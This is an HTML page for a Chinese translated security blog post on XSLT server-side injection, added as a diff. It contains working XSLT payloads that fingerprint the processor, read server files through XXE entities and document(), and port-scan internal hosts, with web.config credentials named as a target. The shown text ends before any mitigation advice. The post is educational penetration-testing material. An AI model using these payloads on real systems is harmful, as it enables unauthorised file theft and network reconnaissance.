@@ -1,0 +1,892 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="en">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.3" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.3">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.ico?v=5.1.3">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.ico?v=5.1.3">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.3" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Inject," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="XSLT漏洞对受影响的应用程序可能造成严重后果，通常的后果是导致远程执行代码。网络上公开exp的XSLT远程代码执行漏洞的例子有这么几个：CVE-2012-5357（影响.Net Ektron CMS）、CVE-2012-1592（影响Apache Struts 2.0）、CVE-2005-3757（影响Google Search Appliance）。 从上面的例子可以看出，XSLT漏洞已经存在">
+<meta name="keywords" content="Inject">
+<meta property="og:type" content="article">
+<meta property="og:title" content="【译】XSLT服务端注入攻击">
+<meta property="og:url" content="/2017-10-09-XSLT-attack/index.html">
+<meta property="og:site_name" content="Security blog">
+<meta property="og:description" content="XSLT漏洞对受影响的应用程序可能造成严重后果，通常的后果是导致远程执行代码。网络上公开exp的XSLT远程代码执行漏洞的例子有这么几个：CVE-2012-5357（影响.Net Ektron CMS）、CVE-2012-1592（影响Apache Struts 2.0）、CVE-2005-3757（影响Google Search Appliance）。 从上面的例子可以看出，XSLT漏洞已经存在">
+<meta property="og:image" content="/2017-10-09-XSLT-attack/XSLT%20attack/XSLT_1.png">
+<meta property="og:image" content="/2017-10-09-XSLT-attack/XSLT%20attack/XSLT_2.png">
+<meta property="og:updated_time" content="2017-12-13T08:59:39.820Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="【译】XSLT服务端注入攻击">
+<meta name="twitter:description" content="XSLT漏洞对受影响的应用程序可能造成严重后果，通常的后果是导致远程执行代码。网络上公开exp的XSLT远程代码执行漏洞的例子有这么几个：CVE-2012-5357（影响.Net Ektron CMS）、CVE-2012-1592（影响Apache Struts 2.0）、CVE-2005-3757（影响Google Search Appliance）。 从上面的例子可以看出，XSLT漏洞已经存在">
+<meta name="twitter:image" content="/2017-10-09-XSLT-attack/XSLT%20attack/XSLT_1.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '5.1.3',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="/2017-10-09-XSLT-attack/"/>
+
+
+
+
+
+  <title>【译】XSLT服务端注入攻击 | Security blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="en">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Security blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            Categories
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            Archives
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            About
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="/2017-10-09-XSLT-attack/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Ꭰ">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Security blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">【译】XSLT服务端注入攻击</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-10-09T23:29:27+08:00">
+                2017-10-09
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Translation/" itemprop="url" rel="index">
+                    <span itemprop="name">Translation</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>XSLT漏洞对受影响的应用程序可能造成严重后果，通常的后果是导致远程执行代码。网络上公开exp的XSLT远程代码执行漏洞的例子有这么几个：CVE-2012-5357（影响.Net Ektron CMS）、CVE-2012-1592（影响Apache Struts 2.0）、CVE-2005-3757（影响Google Search Appliance）。</p>
+<p><em>从上面的例子可以看出，XSLT漏洞已经存在了很长时间，尽管它们相对于其他类似的漏洞（如XML注入）不常见，但我们经常在安全性评估项目中能遇到它们。尽管如此，但该漏洞和利用技术并不为人所知。</em></p>
+<p><em>本文中，我们将演示一系列XSLT攻击去展示以不安全的方式使用该技术的风险。</em></p>
+<p><em>接着会阐述如何执行远程代码、从远程系统窃取数据、网络扫描以及从受害者内网获取资源。</em></p>
+<p><em>我们还可以提供一个存在漏洞的.Net应用程序，并提供有关如何降低这些攻击风险的建议。</em></p>
+<h2 id="什么是XSLT"><a href="#什么是XSLT" class="headerlink" title="什么是XSLT"></a>什么是XSLT</h2><p>XSL是一种将XML文档进行转换的语言，XSLT代表XSL转换，转换本身就是XML文档。</p>
+<p>转换的结果可能是一个不同的XML文档或者其他类型的文档（比如HTML文档、CSV文件或者纯文本）。</p>
+<p>XSLT常见用途是传输不同应用生成的文件数据和作为模版引擎。许多企业型应用程序广泛使用XSLT。比如，多租户开票应用程序可以允许客户端使用XSLT大量定制其发票。客户可以根据具体需要更改发票中显示的信息及其格式。</p>
+<p>其他常见的应用：</p>
+<ul>
+<li>报表功能</li>
+<li>不同格式的数据导出</li>
+<li>打印</li>
+<li>邮件</li>
+</ul>
+<p>在描述这类攻击前，让我们通过一个实际例子来看看转换是如何进行的。</p>
+<p>首先是下面这样的XML文件，包含了水果名和相关描述的列表：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">&lt;?xml version="1.0" ?&gt;</div><div class="line"><span class="tag">&lt;<span class="name">fruits</span>&gt;</span></div><div class="line">  <span class="tag">&lt;<span class="name">fruit</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>Lemon<span class="tag">&lt;/<span class="name">name</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">description</span>&gt;</span>Yellow and sour<span class="tag">&lt;/<span class="name">description</span>&gt;</span></div><div class="line">  <span class="tag">&lt;/<span class="name">fruit</span>&gt;</span></div><div class="line">  <span class="tag">&lt;<span class="name">fruit</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>Watermelon<span class="tag">&lt;/<span class="name">name</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">description</span>&gt;</span>Round, green outside, red inside<span class="tag">&lt;/<span class="name">description</span>&gt;</span></div><div class="line">  <span class="tag">&lt;/<span class="name">fruit</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">fruits</span>&gt;</span></div></pre></td></tr></table></figure>
+<p>为了将XML文档转为纯文本，使用如下XSL转换：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">&lt;?xml version="1.0" encoding="utf-8"?&gt;</div><div class="line"><span class="tag">&lt;<span class="name">xsl:stylesheet</span> <span class="attr">version</span>=<span class="string">"1.0"</span> <span class="attr">xmlns:xsl</span>=<span class="string">"http://www.w3.org/1999/XSL/Transform"</span>&gt;</span></div><div class="line">  <span class="tag">&lt;<span class="name">xsl:template</span> <span class="attr">match</span>=<span class="string">"/fruits"</span>&gt;</span></div><div class="line">    Fruits:</div><div class="line">    <span class="comment">&lt;!-- Loop for each fruit --&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">xsl:for-each</span> <span class="attr">select</span>=<span class="string">"fruit"</span>&gt;</span></div><div class="line">      <span class="comment">&lt;!-- Print name: description --&gt;</span></div><div class="line">      - <span class="tag">&lt;<span class="name">xsl:value-of</span> <span class="attr">select</span>=<span class="string">"name"</span>/&gt;</span>: <span class="tag">&lt;<span class="name">xsl:value-of</span> <span class="attr">select</span>=<span class="string">"description"</span>/&gt;</span></div><div class="line">    <span class="tag">&lt;/<span class="name">xsl:for-each</span>&gt;</span></div><div class="line">  <span class="tag">&lt;/<span class="name">xsl:template</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">xsl:stylesheet</span>&gt;</span></div></pre></td></tr></table></figure>
+<p>使用上述转换规则对数据进行转换的结果是下面的纯文本文件：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">Fruits:</div><div class="line"></div><div class="line">      - Lemon: Yellow and sour</div><div class="line">      - Watermelon: Round, green outside, red inside</div></pre></td></tr></table></figure>
+<h2 id="利用XSLT服务端注入"><a href="#利用XSLT服务端注入" class="headerlink" title="利用XSLT服务端注入"></a>利用XSLT服务端注入</h2><p>在本节中，我们提供一种方法来测试应用程序的XSLT漏洞，并讲述漏洞的发现到利用。在这些示例中，我们专注于使用Microsoft System.Xml XSLT实现的易受攻击的应用程序。然而类似的技术也适用于其他常见的库，如Libxslt，Saxon和Xalan。</p>
+<h4 id="发现存在漏洞的切入点"><a href="#发现存在漏洞的切入点" class="headerlink" title="发现存在漏洞的切入点"></a>发现存在漏洞的切入点</h4><p>第一步是识别应用存在漏洞的部分。</p>
+<p>最简单的情况是应用允许上传任意的XSLT文件。</p>
+<p>如果不是那种情况，易受攻击的应用也可能因为使用了不受信任的用户输入去动态生成XSL转换的XMl文档。</p>
+<p>比如应用可能生成下面的XSLT文档，字符串“Your Company Name Here”源于不受信任的用户输入。</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">&lt;?xml version=”1.0” encoding=”utf-8”?&gt;</div><div class="line"><span class="tag">&lt;<span class="name">xsl:stylesheet</span> <span class="attr">version</span>=<span class="string">"1.0"</span> <span class="attr">xmlns:xsl</span>=<span class="string">"http://www.w3.org/1999/XSL/Transform"</span>&gt;</span></div><div class="line">  <span class="tag">&lt;<span class="name">xsl:template</span> <span class="attr">match</span>=<span class="string">"/fruits"</span>&gt;</span></div><div class="line">    Your Company Name Here</div><div class="line">    Fruits:</div><div class="line">    <span class="comment">&lt;!-- Loop for each fruit --&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">xsl:for-each</span> <span class="attr">select</span>=<span class="string">"fruit"</span>&gt;</span></div><div class="line">      <span class="comment">&lt;!-- Print name: description --&gt;</span></div><div class="line">      - <span class="tag">&lt;<span class="name">xsl:value-of</span> <span class="attr">select</span>=<span class="string">"name"</span>/&gt;</span>: <span class="tag">&lt;<span class="name">xsl:value-of</span> <span class="attr">select</span>=<span class="string">"description"</span>/&gt;</span></div><div class="line">    <span class="tag">&lt;/<span class="name">xsl:for-each</span>&gt;</span></div><div class="line">  <span class="tag">&lt;/<span class="name">xsl:template</span>&gt;</span></div><div class="line">  <span class="tag">&lt;<span class="name">xsl:include</span> <span class="attr">href</span>=<span class="string">"external_transform.xslt"</span>/&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">xsl:stylesheet</span>&gt;</span></div></pre></td></tr></table></figure>
+<p>为了判断应用是否易受攻击，通过注入导致错误XML语法的字符（比如双引号、单引号、尖括号）是有效的方法。如果服务器返回了错误，那么应用则可能易受攻击。总的来说，这种识别技术和XML注入漏洞识别技术是相同的。</p>
+<p>后面要描述的攻击中存在一部分只适用注入点位于文档的特定位置。但不要担心，我们会演示一种通过import和include函数来绕过这种限制。</p>
+<p>为了尽可能简单化，接下来的例子中都是假定我们能够向应用提交任意的XSLT文档。如有特殊情况会另有说明。</p>
+<h4 id="system-property-函数和指纹"><a href="#system-property-函数和指纹" class="headerlink" title="system-property()函数和指纹"></a>system-property()函数和指纹</h4><p>攻击者一旦确认了易受攻击点，那么对他来说识别操作系统指纹和确定正在使用的XSLT实现是很有用的。除此之外，对于攻击者来说了解应用程序使用的XSLT库对于尝试构造攻击载荷是非常有帮助的。</p>
+<p>由于不同的库实现了不同的XSLT特性，一个库中可用的特性在其他库中不一定能用，而且大多时候被实现的专用扩展在不同的库中是不兼容的。</p>
+<p>除了刚才所提到的，库的默认设置会因实现变化而广泛的变化。通常是老版本库默认启用了危险的特性，而新库要求开发人员在需要时明确启用它们。</p>
+<p>我们可以通过system-property()函数来获取库发布者的名字，该函数是XSLT v1.0d的标准，所以所有的库都实现了这一点。</p>
+<p>正确有效的参数是：</p>
+<ul>
+<li>xsl: vendor</li>
+<li>xsl: vendor-url</li>
+<li>xsl: version</li>
+</ul>
+<p>下列转换可以用来判断库的发布者：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">&lt;?xml version="1.0" encoding="utf-8"?&gt;</div><div class="line"><span class="tag">&lt;<span class="name">xsl:stylesheet</span> <span class="attr">version</span>=<span class="string">"1.0"</span> <span class="attr">xmlns:xsl</span>=<span class="string">"http://www.w3.org/1999/XSL/Transform"</span>&gt;</span></div><div class="line">  <span class="tag">&lt;<span class="name">xsl:template</span> <span class="attr">match</span>=<span class="string">"/fruits"</span>&gt;</span></div><div class="line">	<span class="tag">&lt;<span class="name">xsl:value-of</span> <span class="attr">select</span>=<span class="string">"system-property('xsl:vendor')"</span>/&gt;</span></div><div class="line">  <span class="tag">&lt;/<span class="name">xsl:template</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">xsl:stylesheet</span>&gt;</span></div></pre></td></tr></table></figure>
+<p>在本例中，我们测试的是Microsoft .Net System.xml实现的应用，所以system-property()函数返回值是”Microsoft”:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Microsoft</div></pre></td></tr></table></figure>
+<h4 id="数据窃取和使用XXE进行端口扫描"><a href="#数据窃取和使用XXE进行端口扫描" class="headerlink" title="数据窃取和使用XXE进行端口扫描"></a>数据窃取和使用XXE进行端口扫描</h4><p>考虑到XSLT的文档格式是XML，那么常见的XML攻击（比如<a href="https://en.wikipedia.org/wiki/Billion_laughs_attack" target="_blank" rel="external"><em>Billion laughs</em> attack</a>、XML外部实体攻击）也能正常作用于XSLT，这就是很正常的一件事了。<em>billion loughs</em> attack是一种拒绝服务攻击，以耗尽服务器内存资源为目的。就本篇文章目的考虑，我们更倾向于XML外部实体攻击。</p>
+<p>接下来的例子中，我们使用外部实体去获取“C:\secretfruit.txt”的内容。</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">&lt;?xml version="1.0" encoding="utf-8"?&gt;</div><div class="line"><span class="meta">&lt;!DOCTYPE dtd_sample[&lt;!ENTITY ext_file SYSTEM "C:\secretfruit.txt"&gt;]&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">xsl:stylesheet</span> <span class="attr">version</span>=<span class="string">"1.0"</span> <span class="attr">xmlns:xsl</span>=<span class="string">"http://www.w3.org/1999/XSL/Transform"</span>&gt;</span></div><div class="line">  <span class="tag">&lt;<span class="name">xsl:template</span> <span class="attr">match</span>=<span class="string">"/fruits"</span>&gt;</span></div><div class="line">    Fruits &amp;ext_file;:</div><div class="line">    <span class="comment">&lt;!-- Loop for each fruit --&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">xsl:for-each</span> <span class="attr">select</span>=<span class="string">"fruit"</span>&gt;</span></div><div class="line">      <span class="comment">&lt;!-- Print name: description --&gt;</span></div><div class="line">      - <span class="tag">&lt;<span class="name">xsl:value-of</span> <span class="attr">select</span>=<span class="string">"name"</span>/&gt;</span>: <span class="tag">&lt;<span class="name">xsl:value-of</span> <span class="attr">select</span>=<span class="string">"description"</span>/&gt;</span></div><div class="line">    <span class="tag">&lt;/<span class="name">xsl:for-each</span>&gt;</span></div><div class="line">  <span class="tag">&lt;/<span class="name">xsl:template</span>&gt;</span></div><div class="line"></div><div class="line"><span class="tag">&lt;/<span class="name">xsl:stylesheet</span>&gt;</span></div></pre></td></tr></table></figure>
+<p>实体元素将文件内容放在了”ext_file”的引用中，然后通过”&amp;ext_file”在主文档中打印显示出来。输出的结果揭示了文件的内容是”Golden Apple”。</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">Fruits Golden Apple:</div><div class="line"></div><div class="line">      - Lemon: Yellow and sour</div><div class="line">      - Watermelon: Round, green outside, red inside</div></pre></td></tr></table></figure>
+<p>通过该技术可以获取存储在web服务器上的文件和内部系统上的web页面（攻击者无法直接访问），也可能是包含身份认证的配置文件或者包含其他敏感信息的文件。</p>
+<p>除此之外，攻击者亦可通过UNC路径（\\servername\share\file）和URLs（<a href="http://servername/file）而不是文件路径来获取文件，甚至可以通过该技术获取到受害者网络其他系统上的文件。" target="_blank" rel="external">http://servername/file）而不是文件路径来获取文件，甚至可以通过该技术获取到受害者网络其他系统上的文件。</a></p>
+<p>通过事先准备的清单上的IP地址和端口，可以根据应用程序响应来确定远程端口是打开还是关闭。比如，应用程序可能会显示不同的错误消息或在响应中引入时间延迟。</p>
+<p>接下来的XSLT转换使用了URL：<a href="http://172.16.132.1:25" target="_blank" rel="external">http://172.16.132.1:25</a> 而不是上个例子中的本地文件格式。</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">&lt;?xml version="1.0" encoding="utf-8"?&gt;</div><div class="line"><span class="meta">&lt;!DOCTYPE dtd_sample[&lt;!ENTITY ext_file SYSTEM "http://172.16.132.1:25"&gt;]&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">xsl:stylesheet</span> <span class="attr">version</span>=<span class="string">"1.0"</span> <span class="attr">xmlns:xsl</span>=<span class="string">"http://www.w3.org/1999/XSL/Transform"</span>&gt;</span></div><div class="line">  <span class="tag">&lt;<span class="name">xsl:template</span> <span class="attr">match</span>=<span class="string">"/fruits"</span>&gt;</span></div><div class="line">    Fruits &amp;ext_file;:</div><div class="line">    <span class="comment">&lt;!-- Loop for each fruit --&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">xsl:for-each</span> <span class="attr">select</span>=<span class="string">"fruit"</span>&gt;</span></div><div class="line">      <span class="comment">&lt;!-- Print name: description --&gt;</span></div><div class="line">      - <span class="tag">&lt;<span class="name">xsl:value-of</span> <span class="attr">select</span>=<span class="string">"name"</span>/&gt;</span>: <span class="tag">&lt;<span class="name">xsl:value-of</span> <span class="attr">select</span>=<span class="string">"description"</span>/&gt;</span></div><div class="line">    <span class="tag">&lt;/<span class="name">xsl:for-each</span>&gt;</span></div><div class="line">  <span class="tag">&lt;/<span class="name">xsl:template</span>&gt;</span></div><div class="line"></div><div class="line"><span class="tag">&lt;/<span class="name">xsl:stylesheet</span>&gt;</span></div></pre></td></tr></table></figure>
+<p>下方的截图显示了应用程序尝试链接刚才的URL引起的错误返回，这表明了25号端口是关闭的。</p>
+<p><img src="/2017-10-09-XSLT-attack/XSLT attack/XSLT_1.png" alt=""></p>
+<p>接着将URL替换为<a href="http://172.16.132.1:1234" target="_blank" rel="external">http://172.16.132.1:1234</a> ，此时的错误信息截然不同，这暗示着1234端口是开放的。</p>
+<p><img src="/2017-10-09-XSLT-attack/XSLT attack/XSLT_2.png" alt=""></p>
+<p>攻击者可以使用这种技术对受害者的内部网络进行侦察扫描。</p>
+<p>####数据窃取和使用document()进行端口扫描</p>
+<p>document函数允许XSLT转换获取存储在除了主数据源以外的外部XML文档中的数据。</p>
+<p>攻击者可以滥用document函数来读取远程系统的文件，通常是以转换结果的整个内容进行拷贝为手段。但这种攻击要求文件是格式工整的XML文档，但这并不总是个问题，因为大多数时候敏感信息总是存储在XML文件中。比如在一个asp.net web应用中，web.config文件就是个很好的例子因为它包含了数据库认证信息。</p>
+<p>让我们看下这种用法的例子。下面的转换可以用于窃取“C:\secrectfruit.xml”的内容：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">&lt;?xml version="1.0" encoding="utf-8"?&gt;</div><div class="line"><span class="tag">&lt;<span class="name">xsl:stylesheet</span> <span class="attr">version</span>=<span class="string">"1.0"</span> <span class="attr">xmlns:xsl</span>=<span class="string">"http://www.w3.org/1999/XSL/Transform"</span>&gt;</span></div><div class="line">  <span class="tag">&lt;<span class="name">xsl:template</span> <span class="attr">match</span>=<span class="string">"/fruits"</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">xsl:copy-of</span> <span class="attr">select</span>=<span class="string">"document('C:\secretfruit.xml')"</span>/&gt;</span></div><div class="line">    Fruits:</div><div class="line">	    <span class="comment">&lt;!-- Loop for each fruit --&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">xsl:for-each</span> <span class="attr">select</span>=<span class="string">"fruit"</span>&gt;</span></div><div class="line">      <span class="comment">&lt;!-- Print name: description --&gt;</span></div><div class="line">      - <span class="tag">&lt;<span class="name">xsl:value-of</span> <span class="attr">select</span>=<span class="string">"name"</span>/&gt;</span>: <span class="tag">&lt;<span class="name">xsl:value-of</span> <span class="attr">select</span>=<span class="string">"description"</span>/&gt;</span></div><div class="line">    <span class="tag">&lt;/<span class="name">xsl:for-each</span>&gt;</span></div><div class="line">  <span class="tag">&lt;/<span class="name">xsl:template</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">xsl:stylesheet</span>&gt;</span></div></pre></td></tr></table></figure>
+<p>转换的结果显示了上文提到的文件的内容:</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">fruits</span>&gt;</span></div><div class="line">  <span class="tag">&lt;<span class="name">fruit</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>Golden Apple<span class="tag">&lt;/<span class="name">name</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">description</span>&gt;</span>Round, made of Gold<span class="tag">&lt;/<span class="name">description</span>&gt;</span></div><div class="line">  <span class="tag">&lt;/<span class="name">fruit</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">fruits</span>&gt;</span></div><div class="line">    Fruits:</div><div class="line"></div><div class="line">      - Lemon: Yellow and sour</div><div class="line">      - Watermelon: Round, green outside, red inside</div></pre></td></tr></table></figure>
+<p>与XXE攻击相似，document()函数可以用于获取远程系统的文档并且能通过UNC路径或如下所示URL来进行基本的网络扫描：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">&lt;?xml version="1.0" encoding="utf-8"?&gt;</div><div class="line"><span class="tag">&lt;<span class="name">xsl:stylesheet</span> <span class="attr">version</span>=<span class="string">"1.0"</span> <span class="attr">xmlns:xsl</span>=<span class="string">"http://www.w3.org/1999/XSL/Transform"</span>&gt;</span></div><div class="line">  <span class="tag">&lt;<span class="name">xsl:template</span> <span class="attr">match</span>=<span class="string">"/fruits"</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">xsl:copy-of</span> <span class="attr">select</span>=<span class="string">"document('http://172.16.132.1:25')"</span>/&gt;</span></div><div class="line">    Fruits:</div><div class="line">	    <span class="comment">&lt;!-- Loop for each fruit --&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">xsl:for-each</span> <span class="attr">select</span>=<span class="string">"fruit"</span>&gt;</span></div><div class="line">      <span class="comment">&lt;!-- Print name: description --&gt;</span></div><div class="line">      - <span class="tag">&lt;<span class="name">xsl:value-of</span> <span class="attr">select</span>=<span class="string">"name"</span>/&gt;</span>: <span class="tag">&lt;<span class="name">xsl:value-of</span> <span class="attr">select</span>=<span class="string">"description"</span>/&gt;</span></div><div class="line">    <span class="tag">&lt;/<span class="name">xsl:for-each</span>&gt;</span></div><div class="line">  <span class="tag">&lt;/<span class="name">xsl:template</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">xsl:stylesheet</span>&gt;</span></div></pre></td></tr></table></figure>
